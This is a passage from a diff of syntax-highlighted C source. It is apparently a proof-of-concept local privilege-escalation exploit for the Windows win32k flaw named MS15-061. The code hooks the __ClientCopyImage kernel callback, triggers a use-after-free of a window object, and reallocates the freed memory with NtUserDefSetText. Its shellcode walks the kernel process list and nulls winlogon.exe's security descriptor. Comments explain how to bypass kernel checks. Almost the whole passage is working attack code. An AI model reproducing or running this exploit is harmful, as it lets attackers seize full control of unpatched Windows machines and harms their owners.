+    <span class="n">UserHandleTable</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">aheList</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] aheList @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">UserHandleTable</span><span class="p">);</span>
+
+    <span class="n">pServerInfo</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">psi</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] pServerInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Handle Count: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">);</span>
+    <span class="c1">// printf("User Delta 0x%p\r\n", pSharedInfo-&gt;ulSharedDelta); Not used</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kr">__try</span>
+        <span class="p">{</span>
+            <span class="c1">//</span>
+            <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)(</span><span class="n">i</span> <span class="o">|</span> <span class="p">(</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">wUniq</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">kernelWindowHandle</span> <span class="o">==</span> <span class="n">hwnd</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">phead</span><span class="p">;</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Window Handle found %p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernelWindowHandle</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
+        <span class="p">{</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="n">ArbDecByOne</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">originalCLS</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_LARGE_UNICODE_STRING</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">MaximumLength</span> <span class="o">:</span> <span class="mi">31</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">bAnsi</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">PWSTR</span> <span class="n">Buffer</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">LARGE_UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span><span class="n">PLARGE_UNICODE_STRING</span><span class="p">;</span>
+
+<span class="n">VOID</span> <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span>
+    <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">,</span>
+    <span class="n">LPCWSTR</span> <span class="n">psz</span><span class="p">,</span>
+    <span class="n">UINT</span> <span class="n">cchLimit</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
+
+    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span><span class="n">psz</span><span class="p">;</span>
+    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">bAnsi</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">psz</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Length</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">psz</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">Length</span><span class="p">,</span> <span class="n">cchLimit</span><span class="p">);</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">min</span><span class="p">((</span><span class="n">Length</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UNICODE_NULL</span><span class="p">)),</span> <span class="n">cchLimit</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">NTAPI</span> <span class="n">NtUserDefSetText</span><span class="p">(</span>
+    <span class="n">IN</span> <span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">pstrText</span> <span class="n">OPTIONAL</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">116</span><span class="n">Dh</span>
+	<span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span><span class="n">FFE0300h</span>	
+	<span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">]</span>
+	<span class="n">retn</span>    <span class="mi">8</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// the Window Procedure</span>
+<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">kernelHandle</span><span class="p">;</span>
+<span class="kr">__declspec</span><span class="p">(</span><span class="n">noinline</span><span class="p">)</span> <span class="kt">int</span> <span class="n">Shellcode</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// return MessageBoxA(NULL,"Boom","boom",0);</span>
+    <span class="kr">__asm</span> 
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">kernelHandle</span> <span class="c1">// WND - Which window? Check this</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="c1">// THREADINFO</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span> <span class="c1">// ETHREAD</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// flink</span>
+	<span class="nl">procloop:</span>
+	<span class="n">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">-</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+	<span class="n">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x16c</span> <span class="c1">// module name</span>
+	<span class="n">cmp</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x6c6e6977</span> <span class="c1">// “winl” for winlogon.exe</span>
+	<span class="n">jne</span> <span class="n">procloop</span>
+	<span class="n">sub</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x170</span>
+	<span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x0</span> <span class="c1">// NULL ACL</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc2</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">WORD</span> <span class="n">um</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="n">cs</span>
+	<span class="n">mov</span> <span class="n">um</span><span class="p">,</span> <span class="n">ax</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">um</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// USER MODE</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">success</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+       <span class="c1">// DebugBreak();</span>
+
+        <span class="n">Shellcode</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">HWND</span> <span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">SecondWindowIndex</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="kt">void</span> <span class="n">CreateSecondWindow</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
+    <span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"SecondClass"</span><span class="p">;</span>
+
+    <span class="c1">// Step 1: Registering the Window Class</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc2</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="n">LoadCursor</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
+            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
+            <span class="n">g_szClassName</span><span class="p">,</span>
+            <span class="s">L"The title of my window"</span><span class="p">,</span>
+            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
+            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"MS15-061"</span><span class="p">;</span>
+<span class="n">HWND</span> <span class="n">hwnd</span><span class="p">;</span>
+<span class="n">HINSTANCE</span> <span class="n">hInstance2</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">);</span>
+<span class="n">pUser32_ClientCopyImage</span> <span class="n">g_originalCCI</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">__ClientCopyImageAddress</span><span class="p">;</span>
+
+<span class="n">NTSTATUS</span> <span class="n">NTAPI</span> <span class="n">hookCCI</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">LARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">;</span>
+    <span class="c1">// free  WND object</span>
+    <span class="n">DestroyWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
+    <span class="n">UnregisterClassW</span><span class="p">(</span><span class="n">g_szClassName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="cm">/*
+    .text:BF89EA6D                 push    edx
+    .text:BF89EA6E                 call    _xxxClientCopyImage@20 ; xxxClientCopyImage(x,x,x,x,x)
+    .text:BF89EA73                 lea     esi, [edi+58h]  -------&gt;&gt;&gt;&gt; replace edi memeory with NtUserDefSetText
+    .text:BF89EA76                 mov     edx, eax
+    .text:BF89EA78                 mov     ecx, esi
+    .text:BF89EA7A                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
+
+    */</span>
+
+    <span class="n">DebugBreak</span><span class="p">();</span>
+    <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">plstr</span><span class="p">,</span> <span class="p">(</span><span class="n">WCHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">originalCLS</span><span class="p">,</span> <span class="p">(</span><span class="n">UINT</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">NtUserDefSetText</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">SecondWindowIndex</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">plstr</span><span class="p">);</span>
+    <span class="n">SecondWindowIndex</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">g_originalCCI</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">edx</span> <span class="p">,</span> <span class="mh">0xD8</span><span class="p">;</span> <span class="c1">// 0x36 *4 -&gt;  API index *4  number  for  __ClientCopyImage</span>
+	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mx">30h</span><span class="p">]</span> <span class="c1">// EAX=PEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">2</span><span class="n">Ch</span><span class="p">]</span> <span class="c1">// EAX=KernelCallbackTable</span>
+	<span class="n">add</span>	  <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
+	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
+		<span class="c1">//  int 3</span>
+
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">init</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">prot</span><span class="p">;</span>
+
+    <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">);</span>
+    <span class="n">CreateSecondWindow</span><span class="p">();</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">lpvBase</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+        <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0c0c0c0c</span><span class="p">,</span>       <span class="c1">// System selects address</span>
+        <span class="mi">2048</span><span class="p">,</span>                     <span class="c1">// Size of allocation</span>
+        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="c1">// Allocate reserved pages</span>
+        <span class="n">PAGE_READWRITE</span><span class="p">);</span>          <span class="c1">// Protection = no access</span>
+
+    <span class="cm">/*
+    for safe exit  : i used trick like  Browser Fake vTable :
+    allocate 0x0c0c0c0c address and  fill tagWND with 0x0c0c0c0c
+    so every dereference  will loop in 0x0c0c0c0c
+
+    */</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">lpvBase</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">);</span>
+
+    <span class="cm">/*
+   +0x014 bForceMenuDraw   : Pos 15, 1 Bit
+   +0x014 bDialogWindow    : Pos 16, 1 Bit
+   +0x014 bHasCreatestructName : Pos 17, 1 Bit
+   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
+   +0x014 bAnsiWindowProc  : Pos 19, 1 Bit
+   */</span>
+
+    <span class="n">kernelHandle</span> <span class="o">=</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="n">ArbDecByOne</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">kernelHandle</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span> <span class="c1">//</span>
+
+    <span class="n">__ClientCopyImageAddress</span> <span class="o">=</span> <span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"address of __ClientCopyImage is %x </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__ClientCopyImageAddress</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prot</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">g_originalCCI</span> <span class="o">=</span> <span class="p">(</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)</span><span class="n">InterlockedExchangePointer</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hookCCI</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
+    <span class="n">MSG</span> <span class="n">Msg</span><span class="p">;</span>
+
+    <span class="c1">// Step 1: Registering the Window Class</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>   <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback</span>
+
+    <span class="n">init</span><span class="p">();</span>
+
+    <span class="cm">/*
+
+
+        .text:BF91B33C                 mov     edi, [ebp+pclsBase]
+        ..............
+        ..............
+        .text:BF91B346                 mov     eax, [edi+58h]
+        .text:BF91B349                 cmp     eax, [ebp+arg_8] ; new and  old  icon must be  diffrent
+        .text:BF91B34C                 jz      loc_BF91B42C     -----------&gt;&gt;&gt; we  need bypass this
+        ..............
+        ..............
+        .text:BF91B396 loc_BF91B396:                           ; CODE XREF: xxxSetClassIcon(x,x,x,x)+68j
+        .text:BF91B396                 lea     esi, [edi+58h]  ;  EDI
+        .text:BF91B399                 mov     ecx, esi
+        .text:BF91B39B                 mov     edx, [ebp+arg_8]
+        .text:BF91B39E                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
+        .text:BF91B3A3                 cmp     dword ptr [edi+44h], 0
+        .text:BF91B3A7                 jz      short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
+        .text:BF91B3A9                 cmp     dword ptr [esi], 0
+        .text:BF91B3AC                 jnz     short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
+        .text:BF91B3AE                 push    edi
+        .text:BF91B3AF                 call    _xxxCreateClassSmIcon@4 ; xxxCreateClassSmIcon(x)
+
+    */</span>
+
+    <span class="k">do</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Step 2: Creating the Window</span>
+        <span class="n">hwnd</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
+            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
+            <span class="n">g_szClassName</span><span class="p">,</span>
+            <span class="s">L"The title of my window"</span><span class="p">,</span>
+            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
+            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">hwnd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
